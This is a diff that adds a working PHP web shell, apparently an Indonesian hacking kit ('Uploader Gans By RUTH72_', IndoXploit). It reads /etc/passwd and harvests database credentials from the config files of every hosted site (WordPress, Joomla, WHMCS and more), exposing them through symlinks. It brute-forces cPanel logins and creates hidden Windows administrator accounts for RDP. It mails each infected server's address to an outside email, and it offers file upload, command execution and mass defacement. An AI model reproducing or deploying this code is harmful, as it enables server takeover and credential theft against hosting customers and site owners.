+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} ^.*kuontol_sym404 [NC]
+RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
+@file_put_contents("kuontol_sym404/.htaccess",$htaccess);
+}
+if($_POST['config'] == 'grab') {
+						mkdir("kuontol_configgrab", 0777);
+						$isi_htc = "Options all\nRequire None\nSatisfy Any";
+						$htc = fopen("kuontol_configgrab/.htaccess","w");
+						fwrite($htc, $isi_htc);	
+}
+$passwd = $_POST['passwd'];
+
+preg_match_all('/(.*?):x:/', $passwd, $user_config);
+foreach($user_config[1] as $user_kuontol) {
+$grab_config = array(
+"/home/$user_kuontol/.accesshash" => "WHM-accesshash",
+"/home/$user_kuontol/public_html/config/koneksi.php" => "Lokomedia",
+"/home/$user_kuontol/public_html/forum/config.php" => "phpBB",
+"/home/$user_kuontol/public_html/sites/default/settings.php" => "Drupal",
+"/home/$user_kuontol/public_html/config/settings.inc.php" => "PrestaShop",
+"/home/$user_kuontol/public_html/app/etc/local.xml" => "Magento",
+"/home/$user_kuontol/public_html/admin/config.php" => "OpenCart",
+"/home/$user_kuontol/public_html/application/config/database.php" => "Ellislab",
+"/home/$user_kuontol/public_html/vb/includes/config.php" => "Vbulletin",
+"/home/$user_kuontol/public_html/includes/config.php" => "Vbulletin",
+"/home/$user_kuontol/public_html/forum/includes/config.php" => "Vbulletin",
+"/home/$user_kuontol/public_html/forums/includes/config.php" => "Vbulletin",
+"/home/$user_kuontol/public_html/cc/includes/config.php" => "Vbulletin",
+"/home/$user_kuontol/public_html/inc/config.php" => "MyBB",
+"/home/$user_kuontol/public_html/includes/configure.php" => "OsCommerce",
+"/home/$user_kuontol/public_html/shop/includes/configure.php" => "OsCommerce",
+"/home/$user_kuontol/public_html/os/includes/configure.php" => "OsCommerce",
+"/home/$user_kuontol/public_html/oscom/includes/configure.php" => "OsCommerce",
+"/home/$user_kuontol/public_html/products/includes/configure.php" => "OsCommerce",
+"/home/$user_kuontol/public_html/cart/includes/configure.php" => "OsCommerce",
+"/home/$user_kuontol/public_html/inc/conf_global.php" => "IPB",
+"/home/$user_kuontol/public_html/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/wp/test/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/blog/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/beta/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/portal/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/site/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/wp/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/WP/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/news/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/wordpress/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/test/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/demo/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/home/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/v1/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/v2/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/press/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/new/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/blogs/wp-config.php" => "Wordpress",
+"/home/$user_kuontol/public_html/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/blog/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/submitticket.php" => "^WHMCS",
+"/home/$user_kuontol/public_html/cms/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/beta/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/portal/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/site/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/main/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/home/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/demo/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/test/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/v1/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/v2/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/joomla/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/new/configuration.php" => "Joomla",
+"/home/$user_kuontol/public_html/WHMCS/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/whmcs1/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Whmcs/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/whmcs/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/whmcs/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/WHMC/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Whmc/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/whmc/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/WHM/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Whm/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/whm/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/HOST/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Host/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/host/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/SUPPORTES/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Supportes/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/supportes/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/domains/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/domain/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Hosting/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/HOSTING/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/hosting/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/CART/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Cart/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/cart/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/ORDER/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Order/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/order/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/CLIENT/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Client/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/client/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Clientarea/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/clientarea/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/SUPPORT/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Support/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/support/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/BILLING/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Billing/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/billing/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/BUY/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Buy/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/buy/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/MANAGE/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Manage/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/manage/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/ClientSupport/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Clientsupport/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/clientsupport/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/CHECKOUT/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Checkout/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/checkout/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/BILLINGS/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Billings/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/billings/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/BASKET/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Basket/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/basket/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/SECURE/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Secure/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/secure/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/SALES/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Sales/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/sales/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/BILL/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Bill/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/bill/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/PURCHASE/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Purchase/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/purchase/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/ACCOUNT/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Account/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/account/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/USER/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/User/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/user/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/CLIENTS/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Clients/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/clients/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/BILLINGS/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/Billings/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/billings/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/MY/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/My/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/my/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/secure/whm/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/secure/whmcs/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/panel/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/clientes/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/cliente/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/support/order/submitticket.php" => "WHMCS",
+"/home/$user_kuontol/public_html/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/boxbilling/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/box/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/host/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/Host/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/supportes/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/support/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/hosting/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/cart/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/order/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/client/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/clients/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/cliente/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/clientes/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/billing/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/billings/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/my/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/secure/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/support/order/bb-config.php" => "BoxBilling",
+"/home/$user_kuontol/public_html/includes/dist-configure.php" => "Zencart",
+"/home/$user_kuontol/public_html/zencart/includes/dist-configure.php" => "Zencart",
+"/home/$user_kuontol/public_html/products/includes/dist-configure.php" => "Zencart",
+"/home/$user_kuontol/public_html/cart/includes/dist-configure.php" => "Zencart",
+"/home/$user_kuontol/public_html/shop/includes/dist-configure.php" => "Zencart",
+"/home/$user_kuontol/public_html/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/hostbills/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/host/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/Host/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/supportes/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/support/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/hosting/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/cart/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/order/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/client/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/clients/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/cliente/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/clientes/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/billing/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/billings/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/my/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/secure/includes/iso4217.php" => "Hostbills",
+"/home/$user_kuontol/public_html/support/order/includes/iso4217.php" => "Hostbills"
+);  
+
+foreach($grab_config as $config => $nama_config) {
+	if($_POST['config'] == 'grab') {
+$ambil_config = file_get_contents($config);
+if($ambil_config == '') {
+} else {
+$file_config = fopen("kuontol_configgrab/$user_kuontol-$nama_config.txt","w");
+fputs($file_config,$ambil_config);
+}
+}
+if($_POST['config'] == 'symlink') {
+@symlink($config,"kuontol_Symconfig/".$user_kuontol."-".$nama_config.".txt");
+}
+if($_POST['config'] == '404') {
+$sym404=symlink($config,"kuontol_sym404/".$user_kuontol."-".$nama_config.".txt");
+if($sym404){
+	@mkdir("kuontol_sym404/".$user_kuontol."-".$nama_config.".txt404", 0777);
+	$htaccess="Options Indexes FollowSymLinks
+DirectoryIndex kuontol.htm
+HeaderName kuontol.txt
+Satisfy Any
+IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
+IndexIgnore *";
+
+@file_put_contents("kuontol_sym404/".$user_kuontol."-".$nama_config.".txt404/.htaccess",$htaccess);
+
+@symlink($config,"kuontol_sym404/".$user_kuontol."-".$nama_config.".txt404/kuontol.txt");
+
+	}
+
+}
+
+                    }     
+		}  if($_POST['config'] == 'grab') {
+            echo "<center><a href='kuontol_configgrab'><font color=lime>Done</font></a></center>";
+		}
+    if($_POST['config'] == '404') {
+        echo "<center>
+<a href=\"kuontol_sym404/root/\">SymlinkNya</a>
+<br><a href=\"kuontol_sym404/\">Configurations</a></center>";
+    }
+     if($_POST['config'] == 'symlink') {
+echo "<center>
+<a href=\"kuontol_symconfig/root/\">Symlinknya</a>
+<br><a href=\"kuontol_symconfig/\">Configurations</a></center>";
+			}if($_POST['config'] == 'symvhost') {
+echo "<center>
+<a href=\"kuontol_symvhost/root/\">Root Server</a>
+<br><a href=\"kuontol_symvhost/\">Configurations</a></center>";
+			}
+		
+		
+		}else{
+        echo "<form method=\"post\" action=\"\"><center>
+		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
+        echo include("/etc/passwd"); 
+        echo "</textarea><br><br>
+        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
+        <option value=\"grab\">Config Grab</option>
+        <option value=\"symlink\">Symlink Config</option>
+		<option value=\"404\">Config 404</option>
+		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
+}
+}
+if($_GET['do'] == 'tolls') {
+	if($_POST['crack']) {
+		$usercp = explode("\r\n", $_POST['user_cp']);
+		$passcp = explode("\r\n", $_POST['pass_cp']);
+		$i = 0;
+		foreach($usercp as $ucp) {
+			foreach($passcp as $pcp) {
+				if(@mysql_connect('localhost', $ucp, $pcp)) {
+					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
+					} else {
+						$_SESSION[$ucp] = "1";
+						$_SESSION[$pcp] = "1";
+						if($ucp == '' || $pcp == '') {
+							
+						} else {
+							$i++;
+							if(function_exists('posix_getpwuid')) {
+								$domain_cp = file_get_contents("/etc/named.conf");	
+								if($domain_cp == '') {
+									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
+								} else {
+									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
+									foreach($domains_cp[1] as $dj) {
+										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+										$user_cp_url = $user_cp_url['name'];
+										if($user_cp_url == $ucp) {
+											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
+											break;
+										}
+									}
+								}
+							} else {
+								$dom = "<font color=red>function is Disable by system</font>";
+							}
+							echo "USA | CPANEL | FRESH AND VALID 100% | http://$dom:2082 | $ucp | $pcp | 6.00<br>";
+						}
+					}
+				}
+			}
+		}
+		if($i == 0) {
+		} else {
+			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>IndoXploit.</font>";
+		}
+	} else {
+		echo "<center>
+		<form method='post'>
+		USER: <br>
+		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
+		$_usercp = fopen("/etc/passwd","r");
+		while($getu = fgets($_usercp)) {
+			if($getu == '' || !$_usercp) {
+				echo "<font color=red>Can't read /etc/passwd</font>";
+			} else {
+				preg_match_all("/(.*?):x:/", $getu, $u);
+				foreach($u[1] as $user_cp) {
+						if(is_dir("/home/$user_cp/public_html")) {
+							echo "$user_cp\n";
+					}
+				}
+			}
+		}
+		echo "</textarea><br>
+		PASS: <br>
+		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
+		function cp_pass($asui) {
+			$pass = "";
+			$dira = scandir($asui);
+			foreach($dira as $dirb) {
+				if(!is_file("$dir/$dirb")) continue;
+				$ambil = file_get_contents("$dir/$dirb");
+				if(preg_match("/WordPress/", $ambil)) {
+					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
+				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
+					$pass .= ambilkata($ambil,"password = '","'")."\n";
+				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
+					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
+				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
+					$pass .= ambilkata($ambil,'password = "','"')."\n";
+				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
+					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
+				} elseif(preg_match("/^[client]$/", $ambil)) {
+					preg_match("/password=(.*?)/", $ambil, $pass1);
+					if(preg_match('/"/', $pass1[1])) {
+						$pass1[1] = str_replace('"', "", $pass1[1]);
+						$pass .= $pass1[1]."\n";
+					} else {
+						$pass .= $pass1[1]."\n";
+					}
+				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
+					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
+				}
+			}
+			echo $pass;
+		}
+		$cp_pass = cp_pass($asui);
+		echo $cp_pass;
+		echo "</textarea><br>
+		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
+		</form>
+		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
+	}
+}
+if($_GET['do'] == 'RDP') {
+echo '<p>-| Create RDP  |-</p>
+<form action="" method="post">User :<input type="text" name="username" required> Pass :<input type="text" name="password" required> <input type="hidden" name="kshell" value="1"><input type="submit" name="submit" value=">>">
+</form>
+</div>
+
+<center>
+<div id="content-center">
+<p>-{ Option }-</p>
+<form action="" method="post"><input type="text" name="rusername" placeholder="Masukan Username"> <select name="aksi">
+						<option value="1">Tampilkan Username</option>
+						<option value="2">Hapus Username</option>
+						<option value="3">Ubah Password</option>
+				</select>
+<input type="hidden" name="kshell" value="2">
+<input type="submit" name="submit" value=">>"></form>
+</div>';
+}
+if($_POST['submit']){
+echo "<p>---------------{ INFO }---------------</p>";	
+if($_POST['kshell']=="1"){
+	$r_user = $_POST['username'];
+	$r_pass = $_POST['password'];
+	$cmd_cek_user   = shell_exec("net user"); 
+	if(preg_match("/$r_user/", $cmd_cek_user)){
+		echo $gaya_root.$r_user." sudah ada".$o;
+	}else {
+	$cmd_add_user   = shell_exec("net user ".$r_user." ".$r_pass." /add");
+    $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add");
+    $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add");
+    $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add");
+        
+    	if($cmd_add_user){
+    		echo $gaya_root."<p>[add user]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
+    	}else {
+    		echo $gaya_root."<p>[add user]-> ".$r_user." <font color='red'>Gagal</font><p>".$o;
+    	}
+    	if($cmd_add_groups1){
+              echo $gaya_root."<p>[add localgroup Administrators]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
+    	}else
+    	if($cmd_add_groups2){
+              echo $gaya_root."<p>[add localgroup Administrator]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
+    	}else
+    	if($cmd_add_groups3){
+              echo $gaya_root."<p>[add localgroup Administrateur]-> ".$r_user." <font color='greenyellow'>Berhasil</font><p>".$o;
+    	}else {
+    		  echo $gaya_root."<p>[add localgroup]-> ".$r_user." <font color='red'>Gagal - Contact Shor7sec</font><p>".$o;
+    	}
+			  echo $gaya_root."<p>[INFO PC]-> RDP IP ".$_SERVER["HTTP_HOST"]." Username : ".$r_user." Password : ".$r_pass." <font color='greenyellow'>Berhasil</font><p>".$o;
+
+	}
+
+
+
+}else if($_POST['kshell']=="2"){
+
+if($_POST['aksi']=="1"){
+ echo "<pre>".shell_exec("net user");
+}
+else if($_POST['aksi']=="2"){
+$username = $_POST['rusername'];
+$cmd_cek_user   = shell_exec("net user");
+	if (!empty($username)){
+		if(preg_match("/$username/", $cmd_cek_user)){
+		$cmd_add_user   = shell_exec("net user ".$username." /DELETE");
+		if($cmd_add_user){ 
+			echo $gaya_root."<p>[remove user]-> ".$username." <font color='greenyellow'>Berhasil</font><p>".$o;
+		}else {
+			echo $gaya_root."<p>[remove user]-> ".$username." <font color='red'>gagal</font><p>".$o;
+		}
+	}else {
+		echo $gaya_root."<p>[remove user]-> ".$username." <font color='red'>Tidak ditemukan</font><p>".$o;
+	}
+	}else {
+		echo $gaya_root."<p>[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font><p>".$o;
+	}
+}else if($_POST['aksi']=="3"){
+$username = $_POST['rusername'];
+$password = "jancok";
+$cmd_cek_user   = shell_exec("net user");
+	if (!empty($username)){
+		if(preg_match("/$username/", $cmd_cek_user)){
+			$cmd_add_user   = shell_exec("net user ".$username." jancok");
+			if($cmd_add_user){
+			echo $gaya_root."<p>[change password]-> (".$username."|".$password.") <font color='greenyellow'>Berhasil</font><p>".$o;
+		}else {
+			echo $gaya_root."<p>[change password]-> (".$username."|".$password.") <font color='red'>GAGAL</font><p>".$o;
+		}
+	}else
+{
+	echo $gaya_root."<p>[PESAN]-> <font color='red'>Username Tidak Ditemukan di server</font><p>".$o;
+}
+}else
+{
+	echo $gaya_root."<p>[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font><p>".$o;
+}
+		
+}
+
+}
+
+}
+?>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'acenkhaxor@outlook.co.id';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "RUTH72_ PLUGINS INSTALL", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<?php 
+
+
+		
+@ini_set('log_errors',0);
+@ini_set('output_buffering',0);
+set_time_limit(0);
+error_reporting(0);
+if(get_magic_quotes_gpc()){
+    foreach($_POST as $key=>$value){
+        $_POST[$key] = stripslashes($value);
+    }
+}
+echo '<html><head>
+<title>Uploader Gans:3</title>
+<meta http-equiv="Content-Type" content="jpg/png; charset=utf-8"><div class="gmail_extra"><br>
+<link rel="SHORTCUT ICON" href="https://i.ibb.co/k2r1YB6/xsid.jpg">
+<body>
+<style type="text/css">
+	body {
+    background: black;
+    color: #00FF00;
+    font-family: monospace;
+}
+
+.accessGranted {
+    position: absolute;
+    top: 200px;
+    background: #333;
+    padding: 20px;
+    border: 1px solid #999;
+    width: 300px;
+    left: 50%;
+    margin-left: -150px;
+    text-align: center;
+}
+
+.accessDenied {
+    position: absolute;
+    top: 200px;
+    color: #F00;
+    background: #511;
+    padding: 20px;
+    border: 1px solid #F00;
+    width: 300px;
+    left: 50%;
+    margin-left: -150px;
+    text-align: center;
+}
+#content-center {
+    width: 400px;
+    padding: 0px 10px 10px 10px;
+    width: 800px; 
+    margin: 0 auto;
+}
+#content-left {
+margin: 0 auto;
+     text-align: left;
+}
+#content-right {
+margin: 0 auto;
+     text-align: right;
+}
+input,select,textarea{
+    border:0;
+    border:1px solid #900;
+    background:black;
+    margin:0;
+        color: white;
+
+    padding:2px 4px;
+}
+input:hover,textarea:hover,select:hover{
+    background:black;
+        color: blue;
+
+    border:1px solid #f00;
+}
+                        a{ text-decoration:none; color:red;}
+</style>
+</head>
+<H1><center>{ Uploader Gans By RUTH72_ }</center></H1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+';
+echo '<font color="aqua"><center>'.php_uname().'</center></font><br>';
+echo '<tr><td>
+<center>
+<div id="content-center">
+<form method="post">
+<input type="text" name="cmd" size="30"><input type="submit" value="Command">
+</form>
+<br>
++ [ <a href="?"><font color="aqua">Home</font></a> ]-[ <a href="?do=wpm"><font color="aqua">Wp Mass</font></a> ]-[ <a href="?do=jumping"><font color="aqua">Jumping</font></a> ]-[ <a href="?do=mass_deface"><font color="aqua">Mass Deface</font></a> ]-[ <a href="?do=RDP"><font color="aqua">KRDP</font></a> ]-[ <a href="?do=config"><font color="aqua">Config Grab</font></a> ]-[ <a href="?do=config2"><font color="aqua">Grab v2</font></a> ]-[ <a href="?do=tolls"><font color="aqua">Cp Krek</font></a> ] +
+
+<br><br>';
+echo '{RUTH72_} #>';
+if(isset($_GET['path'])){
+    $path = $_GET['path'];   
+}else{
+    $path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
+    if($pat == '' && $id == 0){
+        $a = true;
+        echo '<a href="?path=/">/</a>';
+        continue;
+    }
+    if($pat == '') continue;
+    echo '<a href="?path=';
+    for($i=0;$i<=$id;$i++){
+        echo "$paths[$i]";
+        if($i != $id) echo "/";
+    }
+    echo '">'.$pat.'</a>/';
+}
+echo '</td></tr><tr><td>';
+if(isset($_FILES['file'])){
+    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+        echo '<font color="green">OK COK SUKSESS !!</font><br />';
+    }else{
+        echo '<font color="red">ASU RAIMU ELK :P</font><br />';
+    }
+}
+echo '<center>
+<form enctype="multipart/form-data" method="POST">
+<input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr>';
+if(isset($_GET['filesrc'])){
+    echo "<tr><td>Current File : ";
+    echo $_GET['filesrc'];
+    echo '</tr></td></table><br />';
+    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+    if($_POST['opt'] == 'chmod'){
+        if(isset($_POST['perm'])){
+            if(chmod($_POST['path'],$_POST['perm'])){
+                echo '<font color="green">Change Permission Done.</font><br />';
+            }else{
+                echo '<font color="red">Change Permission Error.</font><br />';
+            }
+        }
+        echo '<form method="POST">
+        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="chmod">
+        <input type="submit" value="Go" />
+        </form>';
+    }elseif($_POST['opt'] == 'rename'){
+        if(isset($_POST['newname'])){
+            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
